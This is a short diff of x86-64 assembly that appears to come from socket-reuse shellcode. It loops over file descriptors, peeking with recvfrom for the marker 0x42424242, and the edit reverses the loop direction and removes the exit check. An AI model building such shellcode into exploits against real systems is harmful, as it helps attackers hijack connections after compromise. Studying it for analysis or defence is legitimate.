@@ -23,16 +23,13 @@ start:
 	jmp check_fd_loop_end
 check_fd_loop_start:
 
-	inc dil			; check next fd
+	dec dil			; check next fd
 	mov rcx, 64		; set MSG_DONTWAIT flag recvfrom
 	or rcx, 2		; set MSG_PEEK flag
 	mov rax, 45		; syscall number for recvfrom
 	syscall			; recvfrom(fd, buf, len, flags, NULL, 0));
 	
 check_fd_loop_end:
-	cmp dil, 0		; if we checked all the flags, but did not find anything, we return.
-	je [rsp + 16]		; This is where the return adress is store
-
 	cmp dword [rsp], 0x42424242 ; let's check if we got the pattern
 	jne check_fd_loop_start
 
